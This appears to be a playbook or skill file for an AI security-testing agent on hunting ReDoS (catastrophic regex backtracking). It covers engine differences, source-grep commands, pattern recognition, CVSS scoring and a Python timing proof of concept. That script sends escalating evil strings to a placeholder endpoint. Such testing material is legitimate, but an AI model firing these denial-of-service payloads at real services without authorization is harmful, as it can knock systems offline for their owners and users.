---
name: redos
description: "Hunt ReDoS (CWE-1333, Catastrophic Backtracking) — identify regexes with nested quantifiers or overlapping alternation that cause super-linear matching time, trace tainted input paths to regex sinks, demonstrate timing PoC, and validate with response-time delta. Covers PCRE/RE2/V8/Python re engine differences. Triggers on: 'ReDoS', 'regex denial', 'catastrophic backtracking', 'redos', 'regex complexity', 'nested quantifiers', 'regex amplification', 'CWE-1333'."
allowed-tools: Bash Read Write
metadata:
  subdomain: web-exploitation
  when_to_use: "redos regex denial catastrophic backtracking regex complexity nested quantifiers regex amplification cwe-1333 pcre re2 v8"
  tags: redos, regex, dos, backtracking, cwe-1333, denial-of-service
  mitre_attack: T1499.004
---

# ReDoS Hunting Playbook

Regular Expression Denial of Service exploits O(2^n) or O(n^2) matching
time in backtracking engines. One crafted string can peg a CPU thread for
seconds or minutes against an otherwise tiny pattern.

## 1. Identify Backtracking Engines in Scope

Not all regex engines backtrack:

| Engine | Language/Runtime | Backtracks? | Vulnerable? |
|--------|----------------|-------------|-------------|
| PCRE / PCRE2 | C, PHP, Apache, nginx | Yes | YES |
| `re` module | Python (pre-3.11 `re`, `regex`) | Yes | YES |
| `java.util.regex` | Java | Yes | YES |
| `RegExp` | JavaScript / V8 | Yes | YES |
| `System.Text.RegularExpressions` | .NET | Yes (w/ timeout option) | YES |
| `regexp` package | Go | DFA-based (RE2) | NO |
| `Oniguruma` | Ruby | Yes | YES |
| RE2 | C++, re2 Python binding | DFA-based | NO |

If the target uses RE2 or Go's `regexp`, skip this playbook — no
backtracking, no ReDoS.

## 2. Source Patterns — Where Tainted Input Reaches Regex

```bash
# Python
grep -rn 're\.match\|re\.search\|re\.fullmatch\|re\.compile\|regex\.match' /workspace/src \
  | grep -v '#' | grep -v 'test_' | grep -v '_test\.py'

# Node.js / TypeScript
grep -rn 'new RegExp\|\.match(\|\.search(\|\.test(' /workspace/src \
  --include='*.js' --include='*.ts' | grep -v 'node_modules'

# Java
grep -rn 'Pattern\.compile\|\.matches(\|\.find(\|String\.matches' /workspace/src \
  --include='*.java'

# PHP
grep -rn 'preg_match\|preg_replace\|preg_split' /workspace/src --include='*.php'

# Ruby
grep -rn 'match\|=~\|Regexp\.new\|\.scan(' /workspace/src --include='*.rb' \
  | grep -v '#'

# Semgrep for tainted-input-to-regex-sink
semgrep --config p/regex /workspace/src --sarif -o /workspace/sem-redos.sarif 2>/dev/null
```

For each hit, determine whether the regex pattern is:
- **Static** (hardcoded string literal) → scan the pattern itself
- **Dynamic** (constructed from user input) → separate vuln class (regex injection);
  flag it and continue

## 3. Catastrophic Pattern Recognition

A regex is potentially catastrophic if it can match the same character
through multiple paths. The two canonical forms:

### Form 1: Nested quantifiers
`(a+)+`, `(a*)*`, `([a-z]+)+`, `(a|a)+`

The inner group can match one character in multiple ways → exponential
backtracking on a string like `aaaa...b`.

### Form 2: Overlapping alternation
`(a|aa)+`, `(a|ab)+c`, `(x+|y+)+z`

Two branches can match the same prefix → exponential when neither
eventually matches the suffix.

### Quick pattern scanner
```bash
# Find potentially catastrophic regexes (grep heuristic)
grep -rn "$(printf \
  '(\([^)]*[+*][^)]*\)[+*])\|(\([^)]*|\[^)]*\)[+*])\|(\([^)]*[+*]\)\{[2-9]\})')" \
  /workspace/src 2>/dev/null | grep -v 'node_modules\|\.min\.js'

# Better: use vuln-regex-detector (if available)
python3 -c "
import subprocess, json, os, sys
# Try to find all regex literals in Python files
import ast, glob
for path in glob.glob('/workspace/src/**/*.py', recursive=True):
    try:
        tree = ast.parse(open(path).read())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                fn = getattr(node.func, 'attr', '') or getattr(node.func, 'id', '')
                if fn in ('compile','match','search','fullmatch'):
                    for arg in node.args:
                        if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
                            print(path, node.lineno, repr(arg.value))
    except Exception:
        pass
" 2>/dev/null | head -50
```

Patterns warranting deeper analysis (flag these):
- Any group with a quantifier inside a quantifier: `(X+)+`, `(X*)+`, `(X+)*`
- Alternation where branches share a prefix: `(ab|a)+`, `(abc|ab)+`
- Long character classes under a star inside a group under a star: `([a-z ]+)+`

## 4. Taint Heuristics — Is This Reachable?

For each flagged regex, trace whether attacker-controlled data reaches the
`pattern`, the `string` argument, or both:

1. `string` tainted, `pattern` static → ReDoS possible if pattern is vulnerable
2. `pattern` tainted → also check for Regex Injection (attacker adds their own
   quantifiers → instant ReDoS)
3. Both tainted → highest risk

For web endpoints, check:
- URL path / query param → regex for routing or validation
- HTTP body field → input validation regex
- Header (User-Agent, Content-Type) → server-side validation

## 5. Timing PoC Construction

A valid PoC must demonstrate measurable time difference between a benign
and a malicious input against the same endpoint.

### Evil string generation

For a vulnerable pattern `(a+)+$` on a string of length n:
- Malicious: `"a" * n + "b"` (forces full backtracking on the trailing `b`)
- Benign: `"a" * n` (matches instantly)

General evil-string construction:
1. Identify the "pump" character (what the repeating group matches)
2. Append a character that breaks the match at the end
3. Scale the pump length until response time > 3× normal

```python
import time, requests

TARGET = "https://<TARGET>/api/validate"
PUMP = "a"
FAIL = "!"

for n in [10, 100, 500, 1000, 5000, 10000]:
    evil = PUMP * n + FAIL
    benign = PUMP * n

    t0 = time.time(); requests.post(TARGET, json={"input": benign},  timeout=30); t_benign = time.time()-t0
    t0 = time.time(); requests.post(TARGET, json={"input": evil},    timeout=30); t_evil   = time.time()-t0

    print(f"n={n}: benign={t_benign:.3f}s  evil={t_evil:.3f}s  ratio={t_evil/max(t_benign,0.001):.1f}x")
    if t_evil > 3.0:
        print(">> CONFIRMED REDOS — halting to avoid DoS")
        break
```

## 6. Validate Finding Contract

Use `validate_finding` with:

```
success_patterns:
  - "<time_evil> > 2.0"        # or match pattern in response body if timed-out
  - "Response time delta > 2s"

negative_command: same request with a short benign input (n=5)
negative_patterns: ["< 0.1s", "< 0.5s"]
```

Minimum bar for a valid ReDoS finding:
- Malicious input takes ≥ 3× longer than benign input of similar length
- Time scales super-linearly with input length (not just 3× at n=100)
- The pattern is reachable without authentication, OR the impact is
  amplified by concurrent requests (even authenticated paths can be DoS)

## 7. Engine-Specific Notes

### JavaScript (V8)
V8 added backtrack-limit mitigations in Node 16+ and Chrome 93+
(`RegExp.prototype.exec` timeout, but controllable via `--max-old-space-size`).
Still exploitable with long inputs or on older Node versions.

### Python `re`
No backtrack limit by default. `re.fullmatch` on complex patterns blocks
the event loop in async frameworks (FastAPI, aiohttp) — single thread DoS.
Test with: `python3 -c "import re,time; t=time.time(); re.match(r'(a+)+$','a'*25+'b'); print(time.time()-t,'s')"`.

### Java `java.util.regex`
Thread-blocking. Servlet containers / Spring endpoints that call
`Pattern.matches(taintedOrBadPattern, input)` without timeout will pin a
thread. Test with `StopWatch` timing.

### PHP `preg_match`
Has `pcre.backtrack_limit` (default 1000000) and `pcre.recursion_limit`
(default 100000). Hitting limits returns `false` (not an error by default),
but causes CPU spike before the limit kicks in.

## 8. Default CVSS

| Scenario | CVSS | Score |
|----------|------|-------|
| Unauthenticated endpoint, n=10K → 10s+ | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H | 7.5 |
| Authenticated, single user DoS | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H | 6.5 |
| Async framework (entire event loop blocked) | AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H | 8.6 |

## 9. Chain Promotion

ReDoS alone is a DoS primitive. Promote via:
- `enables` edge to availability impact node
- If the endpoint is in a critical auth or payment path → escalate severity
- If the regex also leaks match groups (regex injection) → dual vuln class

```
kg_add_node("vulnerability", "ReDoS in /api/validate::input",
  props={"pattern": "(a+)+$", "file": "api/validators.py", "line": 42,
         "cwe": "CWE-1333", "evil_input_len": 10000, "evil_time_s": 12.3,
         "key": "redos:api-validate-input"})
```
